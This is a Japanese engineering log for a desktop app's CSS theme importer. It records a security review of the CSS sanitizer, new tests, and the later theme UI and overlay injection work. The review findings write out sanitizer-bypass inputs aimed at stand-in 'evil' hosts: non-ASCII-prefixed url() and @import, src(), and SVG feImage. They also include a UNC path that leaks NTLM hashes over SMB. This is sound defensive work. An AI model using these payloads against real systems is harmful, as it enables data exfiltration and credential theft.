`cargo check` ✅ ／ `cargo test` ✅ **235 passed**（+78＝ 060b の 65 ＋ review② の 6 ＋ 仕様ギャップ 7）／ `typecheck` ✅ ／ `lint` ✅ ／
`test` ✅ **870 passed / 39 files**（frontend は無改変なので増減ゼロ・CSS guard OK ／ Version sync OK）／
`check:bindings` ✅。

⚠ **`grep -rn "unwrap()\|\.expect(" apps/desktop/src-tauri/src/overlay_theme/` は「OK: panic 経路無し」にならない。**
`commands.rs` の `db.lock().expect("db mutex poisoned")` が**リポジトリ全体の標準イディオム**（37 箇所）で、
`lib.rs` の `WINDOW_OPEN_LOCK` の注記が「**データ持ちの Mutex は poison=`expect` を維持する**」と明示しているため。
ここだけ別の書き方にする理由が無いので**イディオムに従い**、契約テストを 2 段にした——
**本番ロジックの 5 ファイルは panic 経路ゼロ**、`commands.rs` はこのイディオムだけを許して**出現数（5）を固定**する。

### security-review②（外部レビュー・2026-08-05・判定「**修正必須**」・**指摘 8 件すべて反映済み**）

⚠⚠ **自前の security-review が「軽微な懸念あり」で通した後に、実測で 2 件の除去漏れが見つかった。**
レビュー側は敵対的入力 60 本超を `sanitize_css` へ実際に通して出力を目視し、
**修正候補を当てて既存 65 件が green のまま塞がることまで実測**している。

**S-1（High・修正済み）— 非 ASCII 文字が `url(` の直前にあると、除去も残留検証もすり抜ける。**
`is_ident_char` が `>= 0x80` を ident 文字に含めていたため、貪欲読みと相まって **`<NBSP>url` が 1 つの
識別子**になり `lower == "url"` に一致しなかった。さらに `scan_unit` / `find_residual_violation` の
`_ if is_ident_char(c)` アームが**名前を捨てていた**（`(` の確認すらしない）ので二重に見逃していた。実測:

| 入力 | 出力 | `stripped_count` | 残留検証 |
| --- | --- | --- | --- |
| `.a{background:<NBSP>url(https://evil…)}` | **入力と同一** | 0 | `None` |
| `<EM SPACE>` / `×`(U+00D7) / `→`(U+2192) 前置 | 同一 | 0 | `None` |
| `.a{background-image:<NBSP>image-set("https://evil…" 1x)}` | 同一 | 0 | `None` |
| `@import<NBSP>url("https://evil…");` | **`@import` 文が丸ごと残る** | 0 | `None` |

css-syntax-3 の現行仕様では U+00A0 / U+00D7 / U+2003 / U+2192 は **ident code point ではない**ので、
仕様どおりの実装はここを分割して `url(` を url-token として読む＝ egress。Blink / WebKit は歴史的に
`>= 0x80` を ident-start にしているため今日は fetch されない公算が高いが、**WKWebView / WebView2 は
OS 更新で入れ替わる**＝我々のコードを変えずに前提が壊れる。⚠ **module doc が掲げた「判定の失敗が常に
安全側へ倒れる」に反して、engine の実装詳細に賭けて危険側へ倒れていた**のが本質。
→ **`is_ident_char` を ASCII のみに**（「我々が分割してブラウザが結合する」＝過剰除去にしか倒れない）。
`_ if is_ident_char(c)` の近道アームは削除して 1 本に統合。`.配信用{…}` / `--画像:` / 日本語 `content:` が
誤爆しないことをテストで固定。

**S-2（Medium-High・修正済み）— `src()`（CSS Values 4）が判定表に無かった。**
`src:src("https://evil…")` / `background-image:src(var(--u))` が**素通りしていた**。`src()` は
`<url> = <url()> | <src()>` の片割れで、**`<string>` を取り `var()` 置換可能であることが存在理由**の
URL 関数＝ `image-set()` を落とした理由の一般形そのもの。初版の「`image-set()` は裸の文字列を URL 化する
**唯一の実装済み**関数」という理由づけが、**壁の寿命を engine のリリースサイクルに委ねていた**。
→ 表へ `src` を追加し、定数名を `IMAGE_FUNCTIONS` → **`BARE_STRING_URL_FUNCTIONS`** へ改名。
**再修正トリガー＝新しい CSS の画像 / URL 関数が仕様に入ったら、実装状況を問わず表へ足す**と明記。

**S-3（Medium・docs 修正）— security.md §5 例外節の「読んだ内容は frontend へ返らない」が実装と不一致。**
`import_overlay_theme(path)` → `get_overlay_theme_css(id)` の 2 コールで全文が返る＝**合成すると
「拡張子 `.css` に限定された任意ファイル読み取り」**になる（しかも ACL 対象外＝全 4 窓から呼べ、
`path` が dialog 由来かは Rust から確かめられない）。実害は小さいが、**webview には `fs` plugin も
asset protocol も無く「ファイルを読む手段がゼロ」だった**ところに読み取り経路を 1 本新設した事実は
例外の承認根拠として書かれるべき。→ コードは変えず、**§5 と Capabilities 方針の記述を実装に合わせた**
（受容理由 4 点と再修正トリガーつき）。

**S-4（Medium・Windows・修正済み）— UNC パスで SMB 外向き接続＋資格情報漏えい。**
`validate_source_path` が絶対/相対もボリューム種別も見ずに `fs::metadata` を叩いていたため、
`\\evil.example\share\x.css` を渡すと **OS が攻撃者ホストへ SMB 接続し、既定設定では NTLM で
資格情報ハッシュが飛ぶ**（ユーザー操作ゼロ）。⚠ 自前レビューの R-3 はネットワークボリュームを
**可用性**の問題としてしか見ておらず、**egress と資格情報の面が抜けていた**。
→ `\\` / `//` 始まりを**拡張子チェックより前**に拒否（ディスクにもネットワークにも触らない）。

**S-6（Low-Medium・修正済み）— `stripped_import_urls` が 060c の同意ダイアログを騙せる。**
`record_import_url` が `char::is_control` しか見ていなかったため、`javascript:` / `file:` / 相対 URL /
`data:text/css,…` に加えて **bidi / format 文字（U+202E 等）が素通り**していた。userinfo と組み合わせると
`https://ruri.info@evil.example/a.css` のように**別ホストに見える文字列**を同意ダイアログへ出せる。
→ **`http://` / `https://` の絶対 URL のみ**へ限定し、bidi/format 文字を拒否。載せなかったぶんも
`stripped_count` には数える（＝乖離が広がることを doc に明記）。

**S-7（Low・修正済み）— `@supports` のサポート検出が誤診断つきで全拒否されていた。**
プレリュード判定が `any_url_position`（**許可形の `data:` でも立つ**）だったため、
`@supports (background:url(data:image/png;base64,AA)){…}` や実在イディオム
`@supports (background-image:-webkit-image-set(url(a.png) 1x)){…}` が「条件部分に**外部参照**が…」と
**事実と違う文言で拒否**されていた。→ `unit.disallowed > 0 || unit.image_fn` に狭め、文言も
「取り除けない参照」へ改めた（許可形を通しても残留検証が素通しするので安全性は不変）。

**S-5（Medium・未修正・実測待ち）— フラグメント無しの SVG data URI。**
`.a{filter:url("data:image/svg+xml,…<feImage href='https://evil…'/>…")}`（`#` なし）が
**そのまま保存される**ことを実測で確認した（fetch されるかは未確認）。⚠ **MIME 許可リストへ踏み込む前に
実測する**のが正しい順序（実測せずに `image/svg+xml` を落とすと、SVG アイコンを data URI で入れる
実在のチャット CSS を無用に壊す）。**アプリ不要・5 分の手順を `sanitize.rs` の「既知の限界」に記載した**
（`python3 -m http.server 8000` ＋ 素の HTML を Safari / Edge で開き、アクセスログに `HIT` が出るか）。
→ **本人の手番。結果は必ずここに追記すること。**

**S-8（Low・別タスク）— `check:bindings` は未追跡ファイルを検出できない。**
実体が `git diff --exit-code` なので、**新規生成した binding は初回コミットまで検査対象にならない**
（今回の 3 本の緑は空振りだった）。`rakuraku/bindings/` の列挙漏れ（既知）と合わせて、
**列挙方式そのものではなく `git diff` の対象範囲**の問題。`package.json` を触るので別タスクへ。
判断は `model.rs` の module doc に記録。

**品質面の反映（4 件）**: **Q-2** 契約テストの `assert_present_in` が**引数の変数名**に依存していて
rename-only のリファクタで「検証が外された」と**誤診断**する（060a レビュー (5-b) の戒め）→ needle は
そのままにして**失敗メッセージに「引数名を変えただけならテストを直す」と明記** ／ **Q-3** 対応の取れていない
`(` があるとそこから EOF までが 1 宣言になり、参照が 1 つあれば**残り全部が消えて `stripped_count` は 1**
（実測 `.a{width:calc(100% - 10px;}` → 出力 `.a{`）。⚠ ブラウザも同じ範囲を捨てるので**意味論は一致**しており
セキュリティ問題ではないが、UI からは分からない → **060d へサイズ比の警告を申し送り**（`model.rs` に記載）／
**Q-6** `import_overlay_theme` は `async` でも中身はブロッキング I/O ＝「メインスレッドは止まらないが
ワーカーを 1 本塞ぐ」が正確（本来形は `spawn_blocking`）→ コメントを実態に合わせ、再修正トリガーを追記 ／
**Q-8** `expect` の出現数を定数 5 で固定していた（DB ロックを取らないコマンドを足すと偽陽性）→
「全 `expect` が db mutex のものと一致」＋「コマンド数を超えない」の 2 条件へ。

**確認して問題なしとされたもの（レビュー側の実測）**: エスケープ迂回 7 パターン（`\75rl(` 空白なし /
`\000075 rl(` / `u\00072l(` / `\75`+CRLF+`rl(` / `ur\6C(` / `@\49 MPORT` / `\@import`）／
アットルール 12 種（`@counter-style{symbols:url()}` / `additive-symbols` / `@property{initial-value}` /
`@page` / `@scope` / `@starting-style` / `@position-try` / `@container` / `@layer` /
`@font-feature-values` / `@media>@font-face` / ネスト内 `@import`）**すべて個別対応ゼロで正しく除去**／
CSS Nesting 4 形／属性セレクタ内の `{` `}`・`:not(;)`・`--x:(})`・`.a\7d `／
**ブラウザと解釈が分かれうる箇所が軒並み安全側**（`url(data:…(x)` はブラウザが bad-url で捨てる・
`url("data:…"/*c*/)` は我々が落とす・`url/**/(…)` と `\3C url(…)` を残すのは正しい＝どちらも url-token に
ならない）／`is_managed_file_name` の Windows パス表現・ADS・Unicode 正規化／
**拡張子チェックが `fs::metadata` より前**＝非 `.css` パスの存在オラクルにならない／
`log_command_err` は `ErrorCode::log_message()` と `code` しか書かない（`details` のファイル名も
`stripped_import_urls` もログ DB へ到達する経路が無い）／ゼロ拡大 13 項目。

### 仕様ギャップを埋めるテスト追加（+7 件・**5 種のミューテーションで実効性確認済み**）

review② の反映後に「**docs が仕様として主張しているのに、それを守る検査が 1 つも無い**」箇所を洗い出して追加した。
⚠ **どれも「実装に合わせて書いた」のではなく「docs の主張を検査に落とした」もの**である。

| テスト | 何を仕様として固定するか | 出典 |
| --- | --- | --- |
| `a_tampered_file_name_in_the_database_never_escapes_the_managed_directory` | **§5 の出口側**（読み・削除）で `managed_path` が最後の砦として効く。⚠ 既存の `a_traversal_shaped_name_…` は**入口側**（`name` がファイル名に使われない）の担保で、`managed_path` 自体は踏んでいなかった。⚠ **絶対パスを入れるのが最強の検査**＝ Rust の `Path::join` は絶対パスを渡すと元パスを捨てるので、検証を外すと任意ファイル読み取りになる | security.md §5 例外節 |
| `a_bom_is_stripped_before_sanitizing_so_the_import_target_is_still_reported` | **`validate_css_body`（BOM 剥がし）→ `sanitize_css` の順序**。逆順だと `scan_unit` はアットキーワードを**文の先頭でしか**読まないので `@import` として認識されない。⚠ **除去自体は `url()` 経由で起きるため出力だけ見ても気づけない**——現れ方は「060c の同意ダイアログに宛先が出なくなる」 | `validate_css_body` の doc |
| `a_style_end_tag_survives_the_round_trip_because_060d_must_inject_via_text_content` | **`</style>` を含む CSS はそのまま保存する**（正当な CSS なので除去しない）。ここが変わると 060d の「注入は `textContent`」という不変条件が**不要になったと誤解される** | security.md「CSP方針」060b 節 |
| `the_nesting_limit_accepts_the_documented_depth_and_refuses_exactly_one_more` | 入れ子上限の**境界そのもの**（64 段は通り 65 段で拒否）。既存テストは MAX+5 なので `>` → `>=` の変異が生存していた。上限は「スタックオーバーフロー＝ abort を作らない」ための値＝**緩む方向のずれは安全性に直結** | `MAX_NESTING_DEPTH` の doc |
| `every_bidi_and_format_character_keeps_a_target_out_of_the_consent_list` | S-6 の bidi 拒否を**各範囲の両端**で（U+061C / U+200E-F / U+202A-E / U+2066-9）。実装が範囲で書いてあるので 1 つ外れても既存テストでは気づけなかった | security.md「CSP方針」060b 節 |
| `the_theme_origin_is_never_settable_from_the_frontend` | **`origin` はコマンド引数に一切現れない**。model.rs / security.md / task-board が揃ってそう主張していたが**守る仕組みが無かった**。⚠ 060c が text 版コマンドで `origin: String` を生やすのが最も自然な間違い | model.rs の doc |
| `exactly_one_place_sanitizes_and_exactly_one_place_writes` | **保存経路もサニタイズ呼び出しも 1 か所**。⚠ 既存の `every_validation_is_actually_wired_in` は「呼ばれていること」しか見ないので、**2 本目の保存経路が増えたこと**は検出できなかった（060c 申し送りの核心） | `store_sanitized_css` の doc |

加えて **冪等性テストを review② の新規則 3 つへ拡張**（`src()` / 非 ASCII 前置 / 許可形 `data:` プレリュード）。
冪等は 060c の**機能要件**（「取得 CSS ＋ 保存済み CSS」を再度通す）なので、新規則が
「1 周目と 2 周目で違う判断をする」形で入ると 060c で静かに壊れる。

**ミューテーション（5 種すべて KILLED）**: `managed_path` の検証を外す ／ BOM 剥がしを外す ／
入れ子境界を `>` → `>=` ／ bidi 範囲から U+202A..E を外す ／ `fs::write` を 2 か所にする。

⚠ **frontend のテストは追加していない**（870 のまま）。060b は frontend を 1 行も変えておらず、
生成された binding 3 本は**型宣言のみで実行時の振る舞いが無い**ため、テストを書いても
「テストを通すためのテスト」にしかならない。UI の検査は 060d の領分。

### ⚠ 実機確認は未実施（本人の手番）

⚠ **1〜4・6・7 は 060d の完了条件へ移すこと**（コマンドを呼ぶ UI が 060d の領分なので、
ここに置いたままだと忘れられる）。**5 と S-5 の実測は UI を待たずに今できる**（下記）。

1. 依頼者の実サンプル CSS を取り込む → 保存され「**外部参照を 1 件除去**」が返る。
   ⚠ **この時点で見た目は変わらない**（注入は 060d）。⚠⚠ さらに **060d まで作っても「書体しか効かない」**
   （意匠の実体が除去した `@import` の中にある）＝**仕様どおりで、バグではない**。
2. `~/Library/Application Support/<bundle-id>/themes/` に **`<uuid>.css` だけ**が増える（元ファイル名が使われていない）。
3. テーマ名に `../evil` を入れても管理ディレクトリ外にファイルが出ない。
4. 削除するとファイル実体も消える。もう一度削除してもアプリが落ちない（`NotFound` になるだけ）。
5. `lsof -i` で外部 ESTABLISHED が増えない（本タスクは取得しない）。
6. 拡張子違い（`.txt`）／256KB 超／`.css` にリネームしたバイナリ（PNG）が拒否される。
7. `@media (min-width: calc(1px + url(https://x))){…}` を含む CSS が**拒否**され、
   「@media などの条件部分に外部参照が…」という文言が出る（fail-closed の実機確認）。

⚠ **コマンドを呼ぶ UI はまだ無い**（060d の領分）。1〜4・6・7 は 060d の実装後にまとめて確認する
（タスクファイルへ移済み）。

⚠⚠ **訂正: DevTools から `__TAURI__.core.invoke(...)` は使えない。**
`tauri.conf.json` に **`app.withGlobalTauri` が無い＝既定の `false`** なので `window.__TAURI__` は注入されない
（当初この節に書いた手順は誤り）。UI 無しでコマンドを叩くなら、次のどちらか:
- **(a) Vite 経由で API を動的 import する**（設定を触らない）。コメビュ窓の DevTools で
  `const { invoke } = await import("/node_modules/@tauri-apps/api/core.js")` を試す。
- **(b) `tauri.conf.json` に `"withGlobalTauri": true` を一時的に足す**（確実だが
  ⚠ **060b の「`tauri.conf.json` 差分ゼロ」要件に反するので、確認後に必ず戻すこと**）。
→ 手間に見合わないので、**1〜7 はまとめて 060d で消化するのが現実的**。

⚠⚠ **security-review② の S-5（フラグメント無し SVG data URI）の実測も本人の手番**。
アプリ不要・5 分（手順は `sanitize.rs` の「既知の限界」に記載）。**結果はどちらでも本節に追記すること**
——「実測して fetch されなかった」という記録が無いと、次の読者がまた同じ不安を抱えることになる。

### やらないこと（線引き・再修正トリガー付き）

- **外部 `@import` の取得**（060c）。本タスクは**除去する側**で、sidecar / `host-guard.ts` は差分ゼロ。
- **セレクタ変換**（060a が表を持ち 060d が注入時に適用）。**保存するのは変換前の CSS**で、
  Rust で再実装も参照もしない（契約テストが `cssCompat` / `rewriteSelector` の出現を止めている）。
- **CSS の注入・テーマ切替 UI・プレビュー**（060d）。`<style>` を作る処理は 1 行も持ち込んでいない。
- **CSS の構文チェック**（壊れた CSS はブラウザが無視するだけ）。
- **汎用のファイル読み書きコマンド**・`fs` plugin・asset protocol。
- **`origin='snapshot'` の生成**（060c だけが作る。コマンド引数には現れない）。

## 060d テーマ管理 UI ＋ オーバーレイへの注入・切替（2026-08-05）

060 の 3 本目。060a が作った契約と 060b が保存した CSS を、**実際にオーバーレイへ注入して切り替えられる**
ようにした。これで「ローカル CSS を入れて配信画面のデザインを変える」が**通しで動く**。
frontend のみ・**新規依存ゼロ**・**新規 capability ゼロ**・`csp: null` 不変・**Rust / sidecar は差分ゼロ**。

### ⚠⚠ 着手前の調査で崩れた前提 —— frontend は取り込み前のファイルサイズを知らない

タスクファイルの完了条件は「**取り込み前後のサイズ比が極端なら警告する**」で、`overlay_theme/model.rs` の
doc コメントも「取り込み前のファイルサイズは 060d 側が知っているので Rust に足すものは無い」と書いていた。
**これは事実誤認だった**（実コードで確認）:

| 確認項目 | 実測 |
| --- | --- |
| `@tauri-apps/plugin-dialog@2.7.1` の `open()` 戻り型 | `OpenDialogReturn<T>` ＝ `multiple:false` なら **`string \| null`**（パス文字列のみ） |
| `apps/desktop/package.json` の依存 | `@tauri-apps/api` / `plugin-dialog` / `plugin-opener` / react / react-dom。**`plugin-fs` なし** |
| `capabilities/comment-viewer.json` | `core:default` ＋ `dialog:allow-open` のみ。**asset protocol なし** |

→ **frontend は選ばれたファイルを 1 バイトも読めない**＝比率そのものが計算できない。
⚠ **`model.rs` の当該 doc コメントは誤りのまま残っている**（本タスクは Rust 差分ゼロのため触っていない）。
**再修正トリガー＝次に `overlay_theme` を触るとき（060c）にコメントを訂正すること。**

### ①（本人決定）サイズ比 → **構造シグナル（閉じ忘れたブロックの検出）** へ置換

**採用は (b′)**。案は (a) Rust に `sourceBytes`/`savedBytes` を足す ／ (b′) 保存後 CSS の構造を見る ／
(c) 完了条件から外す、の 3 つ。**(b′) は「安いから」ではなく「精度が高いから」選んだ**:

- 病的ケースは構造で一意に見分けられる。対応の取れていない `(` があると、そこから EOF までが 1 宣言として
  除去され、**囲んでいた `}` も一緒に消える**。実測（`model.rs` の注記）: `.a{width:calc(100% - 10px;}` ＋以降
  → 保存されるのは `.a{` だけ。⚠ **末尾が `{` とは限らない**（`.a{color:red;width:calc(1px;}` → `.a{color:red;`）
  ので、末尾 1 文字ではなく**ブロックの深さ**を見る（`unclosedBlockDepth`）。
- ⚠⚠ **比率は正常系と病的ケースを区別できない。** 依頼者の実サンプル（全 6 行のうち 1 行が `@import`）は
  比率で 2〜3 割減るし、`url()` を多数持つ普通のテーマも宣言ごと除去されて数割減る。
  閾値を下げれば誤報、上げれば取り逃す。**誤報する警告は読まれなくなる**ので、これは実質的な劣化。
- ⚠ **実装中に自分の補助案を 1 つ捨てた**。当初は「`strippedCount > 0` かつ保存後 CSS が 64 文字未満」も
  併用する設計だったが、**テストが誤報を実証した**（`.sd-comment{color:red;font-size:20px}` ＋除去 1 件で発火）。
  小さいが健全な CSS を叱ることになるので削除し、代わりに**誤報しないことを固定するテストを 3 ケース**足した。

### ⚠ レビュー区分（本人決定）—— 免除ではなく別チャットへ

`docs/security.md`「レビュー必須条件」には 060a レビュー S-2 で
**「オーバーレイへのユーザー CSS の注入（060d／`<style>` 生成・`insertRule`・`adoptedStyleSheets` 等）」**が
既に追加されており、その節は「**本項が対象にするのは注入する側である**」と明記している。**060d は注入する側そのもの。**
タスクファイルと task-board の「軽レビュー」は、この項目が追加される**前**の記述である。

→ **本セッションは軽レビューのみ**（本人判断）。**security-review は別チャットで実施する。**
⚠⚠ **これは要件の免除ではない**（059a の「下位条件の当てはめで自分を免除した」と同じ形にしないこと）。
**security-review が完了するまで 060d は「レビュー未了」**として task-board に残してある。

### (1) `features/comment-viewer/overlayThemeApi.ts`（新規・invoke ラッパ）

060b の 5 コマンドを包む薄いラッパ。型は `bindings/` の 3 本を再 export（**新しい bindings 先を作らない**）。
`themeNameError()` を同居させたのは、これが**コマンドの契約そのもの**だから。

⚠ **Rust の `validate_theme_name` と厳密に等価にした**（申し送り①「Rust と同じか狭く」）:

| 規則 | Rust | JS |
| --- | --- | --- |
| 制御文字 | `char::is_control`（**C0 ＋ DEL ＋ U+0080..=U+009F**） | **`/\p{Cc}/u`** |
| 長さ | `chars().count() > 80` | **`[...name].length > 80`** |

⚠ よくある `/[\x00-\x1F\x7F]/` では **C1 が漏れる**（frontend が通して Rust が弾く＝「入力できるのに保存できない」）。
⚠ `name.length` は UTF-16 単位なので**絵文字入りの名前で食い違う**。

### (2) `overlaySettings.ts` に `OVERLAY_THEME_KEY` / `loadOverlayTheme` / `saveOverlayTheme`

- 既存 4 キーと同じ作法（非機密の UI 設定値・例外は握りつぶし）。⚠ **CSS 本文は置かない**（Rust が持つ）。
- **不正の定義＝ uuid v4 形式でない**。Rust の `Uuid::new_v4()` と `is_managed_file_name()`（`<uuid v4>.css`）と
  対になっており、細工された localStorage 値がコマンドまで届かない。**再修正トリガー＝ id 採番方式を変えるとき。**
- `saveOverlayTheme(null)` は **`removeItem`**（「未保存＝既定」と「既定を選んだ」を同じ状態に潰す）。

### (3) `features/comment-viewer/cssScope.ts`（新規・純関数 2 本）

**`cssCompat.ts` とは別ファイル**（申し送り③）。⚠ ただし**理由は訂正した**——

> **A-1 訂正**: ガード (10-b) は `cssCompat.ts` から **`/\bto:\s*"([^"]+)"/g`** で抽出した文字列だけを
> 突き合わせている（(10-c) も `from:` のみ）。つまり `const X = ".sd-preview"` のような**素の定数を
> 同ファイルに書いても (10-b) は落ちない**。落ちるのは `to: ".sd-preview"` と書いた場合だけ。
> → 分離の理由は「誤検知回避」ではなく **060a の資産を凍結して差分ゼロを担保するため**（`scanPreludes` を
> `export` して借りることもしない）。この構造は新設した **(10-h)** が固定する。

**`scopeSelectors(css, scope)` の仕様**

| 入力 | 出力 | 理由 |
| --- | --- | --- |
| `.foo{}` | `.sd-preview .foo{}` | 通常の前置 |
| `.a,.b{}` | `.sd-preview .a,.sd-preview .b{}` | **トップレベルのカンマで分割**（`:is()` で束ねると下の読み替えが効かない） |
| `:root{}` / `html{}` / `body{}` | **`.sd-preview{}`** | ⚠ 前置すると絶対に当たらない（実サンプルの `:root{--txtcolor}`） |
| `:root .foo` / `body .foo` | `.sd-preview .foo` | 前置だと `.sd-preview body .foo` で当たらない |
| `html.dark .foo` | `.sd-preview.dark .foo` | **先頭のトークンだけ**置換し複合の残りを保つ |
| `html > body .foo` | `.sd-preview .foo` | 続けて並ぶ root 相当も取り除く |
| **`.sd-overlay{…}`** | **`.sd-preview{…}`** | ⚠ **本タスクで追加した判断**。実配信の窓ルート＝プレビューのラッパ。読み替えないと `.sd-overlay{--sd-comment-bg:…}`（CSS 変数を上書きする唯一の器）が**プレビューでだけ効かない** |
| `.a:not(.b,.c)` / `[t="a,b"]` / コメント内のカンマ | 分割しない | `(` `[`・文字列・コメントを見る |
| `@media`/`@supports`/`@container`/`@layer x{}` | プレリュード**無改変**・中のルールだけ前置 | |
| **`@keyframes x{from{} 50%{} to{}}`** | **無改変** | ⚠ 中身は宣言扱い＝前置するとアニメーションが壊れる |
| `@font-face` / `@page` / `@property` / 文形アットルール | 無改変 | セレクタが無い |
| CSS Nesting（`&`） | 無改変 | `cssCompat` と同じ既知の非対応 |
| 壊れた CSS | throw せず処理できた範囲だけ | 無害に劣化 |

- ⚠ **大小の扱いを分けた**: `html` / `body` / `:root` は CSS 上大小無視なので `i` 付き、
  **`.sd-overlay` はクラス名＝大小区別**なので `i` なし（`.SD-OVERLAY` は別のクラス）。
- ⚠ **冪等ではない**（2 回通すと `.sd-preview` が 2 段になる）。呼ぶのはプレビューの注入 1 か所だけ。
- ⚠ **走査器は `cssCompat.ts` の `scanPreludes` と同型の複製**。意図的だが、**両者は同じ「どこがセレクタか」の
  定義を共有していなければならない**（ずれると「変換されたがスコープされない＝窓へ漏れる」規則が生まれる）。
  `cssScope.test.ts` が **`cssCompat.test.ts` と同じ実サンプル 2 本**を通して一致を実測で固定した。
  **再修正トリガー＝`scanPreludes` を変更したら必ずこちらも見ること。**

**スコープしきれないもの（既知の限界）**

- `@font-face` の `font-family` 名と `@keyframes` の名前は**文書グローバル**。既存名を再定義するテーマだと
  プレビュー中だけコメビュ窓の他所へ波及しうる。→ **プレビューは開いている間だけ `<style>` を置く**（露出を限る）。
- カスタムプロパティは `.sd-preview` に落ちる＝**配下にしか継承しない**（正しく閉じている）。
- `@media` の評価対象はコメビュ窓のサイズであって OBS の出力サイズではない（「だいたいの見え方」と UI に明記）。

`unclosedBlockDepth(css)` は同じ走査器のスタック長を返すだけ（3 つ目の複製を作らないため同居させた）。

### (4) `OverlayApp.tsx` への注入（本機能の芯）

```
if (themeId === null) return;                    // 既定 = <style> を作らない
getOverlayThemeCss(themeId).then((css) => {
  el = document.createElement("style");
  el.dataset.sdOverlayTheme = "";
  el.textContent = rewriteSelectors(css).css;    // ⚠ textContent のみ
  document.head.appendChild(el);                 // CSS Modules より後 = 同詳細度ならユーザー CSS が勝つ
}).catch(() => {});                              // 既定へ倒す・ログに出さない
return () => { cancelled = true; el?.remove(); } // 切替/アンマウントで必ず外す = 常に 0 or 1 個
```

- **保証ベースライン＝read-on-mount**（lazy `useState`）＋ **即時反映＝`storage` 購読**（ベストエフォート）の二段構え。
- ⚠ **`scopeSelectors` は使わない**（窓ごと分かれているので前置する相手がいない）。
- ⚠ **固定コメント窓（`PinnedOverlayApp`）は差分ゼロ**（ガード (10-d) が両方向を固定したまま）。
- ⚠ 切替時は**先に古い `<style>` を外してから**取りに行く。一瞬既定へ戻るが、
  **取得に失敗したときに前のテーマが残らない**（表示と選択状態が食い違わない）ほうを採った。
- ⚠ 取得失敗時に **localStorage を書き換えない**。オーバーレイ窓は表示専用・非フォーカスで、
  設定を書き換える側にしない（気付かせるのはコメビュ窓の責務）。

### (5) `OverlayThemeCard.tsx`（新規）＋ `SettingsView` へ 1 行

- **配置は「OBSに表示」カードの直後（末尾）**。⚠ あのカードには「上の『OBSに自動で反映する』」
  「上のコメント用」「上の設定」という**位置参照の注記が 3 本**あり、途中挿入だと指す先が変わる。
  末尾なら 1 つも壊れない（`SettingsView.tsx` のコメントが警告している既知の制約に従った）。
- **一覧はラジオ**（Select だと**削除・改名のために一度選択する必要があり、選択＝配信画面へ即適用**になる）。
  200 件まで登録できるのでスクロール箱（`.themeList` に `max-height`）に入れた。
- ⚠ **state をこのコンポーネントが持つ**（`SettingsView` は表示専用・state は親、からの意図的な逸脱）。
  理由 ①`SettingsViewProps` は既に 30 個超 ②選択中 id の**消費者はオーバーレイ窓だけ**（経路は localStorage）
  ③`CommentViewerApp.tsx` は 1900 行超 ④`ViewersView` / `ViewerDetailPanel` の先例。
  `SettingsView` から渡すのは**プレビューの体裁に要る 2 つだけ**。
- **取り込みはカード内インラインフォーム**（`ConfirmDialog` に入力欄が無い／新規部品を増やさない）。
  ファイル名から初期値を作り、**同じフォームを改名でも使い回す**。⚠ **パスは画面に出さない**（basename のみ・§9）。
- **プレビューは `CommentList variant="overlay"` を再利用**（ダミー 2 件＝chat ＋ スーパーチャット）。
  060a が CSS 変数の既定値を「参照側の `var(--sd-X, 現行値)` フォールバック」に置いたおかげで、
  **`.root` の外（`.sd-preview` 配下）でも意匠が保たれる**——060a が予告していた副産物が実際に効いた。

**⚠ 復帰導線（壊れたテーマからの脱出）**

- 「既定のデザインに戻す」は**常時表示・常時有効**。⚠ **一覧の取得に失敗していても押せる**ことをテストで固定した
  （ここが唯一の脱出路なので、一覧の状態に依存させない）。
- 選択中を削除したら `saveOverlayTheme(null)`。
- 保存済み id が一覧に無いときは**黙って既定へ倒さず警告する**（058a の「以前選んだデバイスが見つかりません」と同型・
  ⚠ 読み込み中は判定しない＝起動直後に一瞬赤くならない）。

### ⑨ 取り込み結果の文言と根拠の対応

| 文言 | 根拠 | 条件 |
| --- | --- | --- |
| 「『{name}』を取り込みました。」 | `theme.name` | 常時 |
| 「**取り込めない参照**を N 件除去しました（外部サイトの画像やフォント、相対パスの指定などを含みます）。」 | `theme.strippedCount` | `>0`。⚠ 「外部参照を」は不正確（申し送り③） |
| 「うち N 件は**外部サイトの CSS の読み込み（@import）**です。StreamDock は外部サイトへ接続しないため、その中に書かれたデザインは反映されません。」 | `strippedImportUrls.length` | `>0`。⚠⚠ **「書体しか効かない」の説明はこの 1 本**。無いと仕様どおりの挙動がバグに見える |
| 「M 個のルールを StreamDock 用に変換しました。」 | `rewriteSelectors().rewritten` | `>0` |
| 「変換できたルールでも、指定の一部が StreamDock に無い要素を指していると反映されないことがあります。」 | レビュー Q-1 | `rewritten>0` のとき**必ず併記**（`rewritten` 単独を成功件数に見せない） |
| 「**K 種類**のセレクタは変換できませんでした（この指定は反映されません）: …」 | `rewriteSelectors().unmatched` | `>0`・**clamp 後**。⚠ 「種類」であってルール数ではない（申し送り②） |
| 「CSS の大部分が取り込めていない可能性があります。括弧（ ( と ) ）の対応が取れているか確認してください。」 | `unclosedBlockDepth(css) > 0` | ①の判定 |
| 「同じ名前のデザインが既にあります。」 | 一覧との突き合わせ | ⚠ **ブロックしない**（申し送り②）。入力中にも出す |
| `@media` プレリュード拒否 等 | **Rust の `AppError.message` をそのまま表示** | ⚠ **frontend で文言を書き直さない**（分裂させない） |

**clamp（060a レビュー S-1）**: 件数 **10 件**まで（以降「ほか N 件」）／1 件 **60 文字**（コードポイント単位で切る）／
表示前に `/\p{Cc}/gu` を除去し `/\s+/g` を空白 1 個へ正規化。
⚠ **`name` に追加の clamp は不要**（Rust が 80 文字・制御文字なしを保証済み）。代わりに入力フォーム側で同じ規則を先に当てる。

### ⑧ `strippedImportUrls` の扱い（060c の受け皿）

- **URL 本体は画面に出さない。件数だけ**。⚠ 060c が要求する「ホストを別行で強調」（userinfo 付き URL の
  表示偽装対策・060b review② S-6）が無いまま素の URL を出すと、**060c の同意画面より弱い形で同じ文字列を
  先に見せる**ことになる。ログにも出さない（§9・テストで `ruri.info` が DOM に出ないことを固定）。
- **受け皿＝`runImport()` という単一の async ハンドラ ＋ `lastImport` 相当の state（`outcome`）に
  `OverlayThemeImportResult` を丸ごと保持**。
  ⚠⚠ **060c は `await importOverlayTheme(...)` の直後・`setOutcome` の前に同意ダイアログと取得を挟むだけでよい。**
  `strippedImportUrls` は DB に無い＝**この 1 回しか手に入らない**ので、他の場所からは後付けできない。

### 静的ガード (10-h) / (10-i) を新設

| 検査 | 内容 |
| --- | --- |
| **(10-h)** | `PREVIEW_SCOPE_CLASS = "sd-preview"` の定義が `cssScope.ts` に**ちょうど 1 か所**／ラッパが `className={PREVIEW_SCOPE_CLASS}` である／`cssCompat.ts` には `sd-preview` が**現れない** |
